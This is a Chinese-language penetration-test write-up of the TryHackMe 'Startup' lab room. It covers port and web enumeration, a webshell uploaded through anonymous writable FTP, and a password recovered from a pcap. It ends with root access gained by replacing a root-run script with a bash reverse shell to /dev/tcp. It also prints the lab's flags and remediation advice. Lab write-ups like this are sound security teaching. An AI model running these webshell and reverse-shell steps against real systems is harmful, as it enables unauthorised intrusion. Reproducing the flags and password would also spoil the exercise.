# THM 10.49.132.229 渗透测试 Writeup

**日期**: 2026-06-03
**测试者**: yao
**目标**: 10.49.132.229
**平台**: TryHackMe 授权靶场 (Startup)
**耗时**: ~60 分钟
**状态**: ✅ 全部完成 (2/2 Flags)

---

## 1. 信息搜集

### 1.1 端口扫描
采用定向端口扫描策略（避免防火墙欺骗）：

```bash
nmap -sS -p21,22,80,443,445,8080,8443,2222 -T4 --open 10.49.132.229
```

**结果**：
| 端口   | 状态 | 服务 | 版本                             |
| ------ | ---- | ---- | -------------------------------- |
| 21/tcp | open | FTP  | vsftpd 3.0.3 (匿名登录允许)      |
| 22/tcp | open | SSH  | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 |
| 80/tcp | open | HTTP | Apache 2.4.18 (Ubuntu)           |

### 1.2 Web 枚举
```bash
gobuster dir -u http://10.49.132.229 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
```

**发现**：
- `/files` → FTP 文件可通过 Web 访问
- HTTP 标题: "Maintenance"

### 1.3 FTP 匿名枚举
```bash
ftp anonymous@10.49.132.229
```

**发现**：
- `/ftp/important.jpg`
- `/ftp/notice.txt`
- `/ftp` 目录可写 (drwxrwxrwx)
- `/incidents/suspicious.pcapng` - 网络抓包文件 (31224 bytes)

---

## 2. 初始访问

### 2.1 Web Shell 上传
利用 FTP 可写目录 + Web 映射获取 shell：

```bash
# 上传 webshell 到 FTP
curl -T shell.php ftp://anonymous@10.49.132.229/ftp/shell.php

# 通过 Web 访问触发
http://10.49.132.229/files/ftp/shell.php
```

**获取**: `www-data` shell

### 2.2 PCAP 分析
提取 `/incidents/suspicious.pcapng` 到 Kali 分析：

```bash
# 从 pcap 提取终端会话
tshark -r startup.pcapng 2>/dev/null
strings startup.pcapng | grep -i "pass\|login\|lennie\|sudo"
```

**发现终端会话**：
- 用户 `lennie` 尝试 `cd lennie` 失败
- `sudo -l` 3 次密码尝试
- 从终端回显推断密码: `c4ntg3t3n0ughsp1c3`

---

## 3. 横向移动

### 3.1 SSH 登录 lennie
```bash
ssh lennie@10.49.132.229
# 密码: c4ntg3t3n0ughsp1c3
```

**系统信息**：
- OS: Ubuntu 16.04.7 LTS
- Kernel: Linux 4.4.0-190-generic x86_64
- 用户: lennie (uid=1002)

### 3.2 User Flag
```bash
cat ~/user.txt
```

**Flag**: `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`

---

## 4. 权限提升

### 4.1 发现可疑脚本
```bash
ls -la ~/scripts/
```

**发现**：
- `planner.sh` (root 所有, 可执行)
- `startup_list.txt` (lennie 所有)

### 4.2 分析 planner.sh
```bash
cat ~/scripts/planner.sh
```

**内容**：
```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

**分析**：
- root 执行 planner.sh
- planner.sh 调用 `/etc/print.sh`
- `/etc/print.sh` 属主是 lennie，可写！

### 4.3 验证 print.sh 权限
```bash
ls -la /etc/print.sh
```

**结果**：
```
-rwx------ 1 lennie lennie 25 Nov 12 2020 print.sh
```

### 4.4 劫持 print.sh 提权
修改 `/etc/print.sh` 添加反向 shell：

```bash
cat > /etc/print.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.241.203/5555 0>&1
EOF
chmod +x /etc/print.sh
```

**监听等待 root 执行**：
```bash
nc -lvnp 5555
```

**结果**：root 执行 planner.sh → 调用被劫持的 print.sh → 获取 root shell

### 4.5 Root Flag
```bash
cat /root/root.txt
```

**Flag**: `THM{f963aaa6a430f210222158ae15c3d76d}`

---

## 5. 攻击路径总结

```
[信息搜集]
  └── Nmap 扫描 → 发现 21/22/80 端口
      └── FTP 匿名登录 + Web 枚举
          ├── /files 目录 (FTP→Web 映射)
          ├── /incidents/suspicious.pcapng
          └── 上传 webshell → www-data shell
              └── PCAP 分析 → 提取 lennie 密码
                  └── SSH 登录 lennie
                      └── 发现 ~/scripts/planner.sh (root)
                          └── 发现 /etc/print.sh (lennie 可写)
                              └── 劫持 print.sh → root shell
                                  └── root flag
```

---

## 6. 漏洞分析

### 6.1 漏洞列表

| 漏洞                | 风险等级 | 说明                                               |
| ------------------- | -------- | -------------------------------------------------- |
| FTP 匿名访问 + 可写 | 高       | vsftpd 允许匿名登录且目录可写，可上传 webshell     |
| Web-FTP 映射        | 高       | /files 目录映射 FTP 文件，导致 webshell 可直接访问 |
| 终端会话泄露        | 高       | pcapng 文件泄露终端会话，暴露密码输入              |
| 弱密码              | 中       | 密码 `c4ntg3t3n0ughsp1c3` 可从 pcap 提取           |
| 权限配置不当        | 高       | root 脚本引用用户可写文件，导致权限劫持            |

### 6.2 修复建议

1. **禁用 FTP 匿名访问**
   ```
   anonymous_enable=NO
   ```

2. **禁止 FTP 目录可写**
   - 移除匿名用户的写权限
   - 使用 chroot 限制 FTP 目录

3. **删除敏感日志/抓包文件**
   - `/incidents/suspicious.pcapng` 包含敏感信息
   - 定期清理日志文件

4. **修复权限配置**
   - root 脚本不应引用用户可写文件
   - 将 `/etc/print.sh` 改为 root 所有
   - 使用不可变的脚本路径

5. **网络流量加密**
   - 避免明文传输敏感数据
   - 使用 SSH 替代 Telnet/FTP

---

## 7. 技术细节

### 7.1 工具使用
- **Nmap**: 端口扫描与服务识别
- **Gobuster**: Web 目录爆破
- **FTP**: 匿名枚举与文件上传
- **tshark/strings**: PCAP 分析
- **nc**: 反向 shell 监听

### 7.2 关键命令速查
```bash
# 端口扫描
nmap -sS -p21,22,80 -T4 --open 10.49.132.229

# Web 目录爆破
gobuster dir -u http://10.49.132.229 -w common.txt -x php,txt,html,bak

# FTP 上传 webshell
curl -T shell.php ftp://anonymous@10.49.132.229/ftp/shell.php

# PCAP 分析
tshark -r suspicious.pcapng
strings suspicious.pcapng | grep -i pass

# 权限提升 - 劫持脚本
cat > /etc/print.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1
EOF

# 监听反向 shell
nc -lvnp 5555
```

---

## 8. 时间线

| 时间  | 动作                         | 结果                         |
| ----- | ---------------------------- | ---------------------------- |
| T+0m  | Nmap 初始扫描                | 发现 21/22/80 端口           |
| T+5m  | FTP 匿名枚举 + Web 枚举      | 发现 /files 目录 + pcap 文件 |
| T+10m | 上传 webshell                | 获取 www-data shell          |
| T+15m | PCAP 提取与分析              | 获取 lennie 密码             |
| T+20m | SSH 登录 lennie              | 获取 user flag               |
| T+25m | 发现 planner.sh + print.sh   | 确认权限劫持路径             |
| T+30m | 劫持 print.sh 等待 root 执行 | 获取 root shell              |
| T+35m | Root shell                   | 获取 root flag               |

---

## 9. 参考

- [GTFOBins](https://gtfobins.github.io/)
- [THM Startup Room](https://tryhackme.com/)
- [Wireshark PCAP Analysis](https://www.wireshark.org/)

---

**文档状态**: ✅ 完成
**最后更新**: 2026-06-03